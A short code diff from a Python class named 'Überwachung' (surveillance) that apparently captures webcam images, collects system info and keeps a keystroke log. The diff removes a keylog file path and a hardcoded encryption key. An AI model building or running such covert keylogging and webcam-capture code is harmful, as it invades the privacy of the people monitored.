@@ -115,8 +115,7 @@ class Überwachung:
         except Exception as e:
             logging.error(f"Fehler bei der Webcam-Aufnahme: {e}")
             
-    dateien = [ r'logs\tastenprotokoll\protkoll.txt,']
-    schlüssel = b'MujBTqtZ4QCQW_fmlMHVWBmTVRW8IGZSuxFctu_D3d0'
+
 
     def ausführen(self, intervall=60):
         self.sysinfo()
